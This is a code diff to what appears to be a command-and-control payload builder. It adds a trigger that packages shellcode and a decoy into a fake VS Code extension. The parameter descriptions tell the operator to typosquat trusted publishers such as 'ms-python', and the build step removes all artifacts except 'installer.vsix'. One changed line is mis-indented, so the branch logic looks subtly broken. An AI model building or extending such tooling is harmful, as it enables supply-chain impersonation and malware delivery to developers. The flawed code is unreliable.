@@ -67,6 +67,7 @@ _REQUIRED_PLUGIN_FUNCTIONS = [
     "create_qr_html_trigger",
     "create_encrypted_html_smuggling_trigger", "create_geofenced_html_smuggling_trigger",
     "salt_text",
+    "create_vscode_ext_trigger",
     # Linux / macOS initial access triggers
     "create_bash_trigger",
     "create_desktop_trigger",
@@ -1269,7 +1270,7 @@ appdomain (self)""",
             name="0.9 Trigger Type",
             parameter_type=BuildParameterType.ChooseOne,
             description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
-            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG", "HTML-Encrypted", "HTML-Geofenced", "SearchMS", "UDL", "QR", "AppDomain"],
+            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG", "HTML-Encrypted", "HTML-Geofenced", "SearchMS", "UDL", "QR", "AppDomain", "VSCode"],
             default_value="BAT",
             required=False,
             hide_conditions = [
@@ -1317,6 +1318,7 @@ appdomain (self)""",
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="URL"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="VSCode"),
                 HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
         ),
@@ -1335,7 +1337,34 @@ appdomain (self)""",
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="HTML"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickFix"),
                 HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="URL"),
+                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="VSCode"),
                 HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9w VSCode Fake Name",
+            parameter_type=BuildParameterType.String,
+            description="VSCode extension internal name shown in the Extensions panel. Typosquat a known publisher (e.g. 'vscode-python-tools', 'prettier-vscode').",
+            default_value="vscode-python-tools",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type",       operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type",            operand=HideConditionOperand.NotEQ, value="VSCode"),
+            ]
+        ),
+
+        BuildParameter(
+            name="0.9x VSCode Publisher",
+            parameter_type=BuildParameterType.String,
+            description="VSCode extension publisher field shown in the Extensions panel. Typosquat a known publisher (e.g. 'ms-python', 'esbenp', 'dbaeumer').",
+            default_value="ms-python",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Main Payload Type",       operand=HideConditionOperand.NotEQ, value="Loader"),
+                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
+                HideCondition(name="0.9 Trigger Type",            operand=HideConditionOperand.NotEQ, value="VSCode"),
             ]
         ),
 
@@ -3156,6 +3185,9 @@ generated if none have been entered.""",
             ("2.0 Trigger Type", "MSI",        [("T1218.007", "Msiexec")]),
             ("2.0 Trigger Type", "LNK",        [("T1204.002", "User Execution: Malicious File")]),
             ("2.0 Trigger Type", "MSC",        [("T1218.014", "MMC")]),
+            ("2.0 Trigger Type", "VSCode",     [("T1204.002", "User Execution: Malicious File"),
+                                                ("T1059.007", "JavaScript"),
+                                                ("T1546",     "Event Triggered Execution")]),
             # Container
             ("3.0 Container Type", "ISO",      [("T1553.005", "Mark-of-the-Web Bypass")]),
             ("3.0 Container Type", "VHD",      [("T1553.005", "Mark-of-the-Web Bypass")]),
@@ -3455,6 +3487,10 @@ generated if none have been entered.""",
                 url="https://login.microsoftonline.com/",
                 output_filename="verify.html",
                 payload_dir=w / "payload")),
+            ("VSCode", lambda w: create_vscode_ext_trigger(
+                shellcode_path=pathlib.Path(mythic_shellcode_path),
+                payload_dir=w / "payload",
+                decoy_file=decoy_file)),
             ("AppDomain", lambda w: create_appdomain_config(
                 target_exe="AddInProcess.exe",
                 output_dir=w / "payload")),
@@ -3627,7 +3663,8 @@ generated if none have been entered.""",
                 }
                 target_ext = _ext_map.get(_fmt, ".xlsm")
         else:
-            target_ext = f".{self.get_parameter('0.9 Trigger Type').lower()}"
+            _raw_trigger_ext = self.get_parameter('0.9 Trigger Type').lower()
+        target_ext = ".vsix" if _raw_trigger_ext == "vscode" else f".{_raw_trigger_ext}"
 
 
         match(self.get_parameter("3.0 Container Type")):
@@ -5776,6 +5813,29 @@ generated if none have been entered.""",
                                 payload_dir=payload_dir,
                                 decoy_path=str(decoy_file) if decoy_file.exists() else "",
                             )
+
+                        case "VSCode":
+                            trigger_path = create_vscode_ext_trigger(
+                                shellcode_path=pathlib.Path(mythic_shellcode_path),
+                                payload_dir=payload_dir,
+                                decoy_file=decoy_file,
+                                fake_name=self.get_parameter("0.9w VSCode Fake Name") or "vscode-python-tools",
+                                publisher=self.get_parameter("0.9x VSCode Publisher") or "ms-python",
+                                output_filename="installer.vsix",
+                            )
+
+                            if trigger_path and pathlib.Path(trigger_path).exists():
+                                _vsix_abs = pathlib.Path(trigger_path).resolve()
+                                for _item in list(payload_dir.iterdir()):
+                                    if _item.resolve() == _vsix_abs:
+                                        continue
+                                    if _item.is_dir():
+                                        shutil.rmtree(_item, ignore_errors=True)
+                                    else:
+                                        try:
+                                            _item.unlink()
+                                        except Exception:
+                                            pass
 
                         case "URL":
                             trigger_path = create_url_trigger(
